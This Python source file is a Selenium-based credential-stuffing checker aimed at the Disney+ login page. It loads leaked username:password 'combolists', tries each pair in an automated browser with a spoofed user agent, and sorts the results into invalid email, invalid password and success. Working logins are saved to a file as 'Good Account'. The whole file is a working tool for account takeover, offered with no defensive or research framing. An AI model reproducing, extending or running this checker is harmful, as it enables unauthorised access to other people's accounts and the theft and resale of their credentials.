import time
import os

from titles.disney_title import title
from combo_splitters.split_combos import ComboSplitter
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementClickInterceptedException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path


def disney():
    title()
    file_directory = str(Path(__file__).parents[1]) + '/combolists/disney'
    plain_directory = str(Path(__file__).parents[1])
    page = 'https://www.disneyplus.com/login'
    login_process_complete = False
    iframe = False
    splitter = ComboSplitter(file_directory, "disney")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error(plain_directory + '/combolists/')
        exit()
    browser_options = Options()
    browser_options.add_argument(
        'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
    browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
    #browser_options.add_argument("--headless=new")
    os.makedirs(plain_directory + '/accounts', exist_ok=True)
    index = 0
    while index != len(users):
        os.makedirs(plain_directory + '/accounts', exist_ok=True)
        with open(plain_directory + '/accounts/disney_acc', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                browser = webdriver.Chrome(options=browser_options)
                browser.set_window_size(400,600)
                browser.get(page)
                time.sleep(16)
                if browser.find_elements(By.XPATH, '//*[@id="onetrust-reject-all-handler"]'):
                    gdpr_reject_all = browser.find_element(By.XPATH, '//*[@id="onetrust-reject-all-handler"]')
                    gdpr_reject_all.click()
                email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                email_input_box.send_keys(users[index])
                time.sleep(2)
                action = ActionChains(browser)
                email_input_box.send_keys(Keys.TAB)
                time.sleep(1)
                email_input_box.send_keys(Keys.ENTER)
                time.sleep(6)
                if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[3]/div/div'):
                    print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                    iframe = True
                if browser.find_elements(By.XPATH, '//*[@id="loginEmail"]/div[2]/button') and iframe != True:
                    continue_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
                    continue_button.click()
                if 'https://www.disneyplus.com/identity/login/enter-password' in browser.current_url:
                    pass_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                    pass_input_box.send_keys(passwords[index])
                    time.sleep(2)
                    pass_input_box.send_keys(Keys.TAB)
                    time.sleep(1)
                    pass_input_box.send_keys(Keys.ENTER)
                    time.sleep(7)
                    login_process_complete = True
                if login_process_complete:
                    time.sleep(10)
                    if browser.find_elements(By.XPATH, '//*[@id="password__error"]'):
                        print(" | {}:{} ---> Invalid Password".format(users[index], passwords[index]))
                    elif browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section') or 'home' in browser.current_url:
                        print(" | {}:{} ---> Success!".format(users[index], passwords[index]))
                        account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
                    else:
                        print(" | {}:{} ---> Invalid Account".format(users[index], passwords[index]))
                else:
                    print(" | {}:{} ---> Invalid Account".format(users[index], passwords[index]))
                index += 1
                iframe = False
                login_process_complete = False
                browser.close()
            except NoSuchElementException:
                print(" | Timed Out")
            except ElementClickInterceptedException:
                print(" | Element Intercepted...continuing from where I left off")
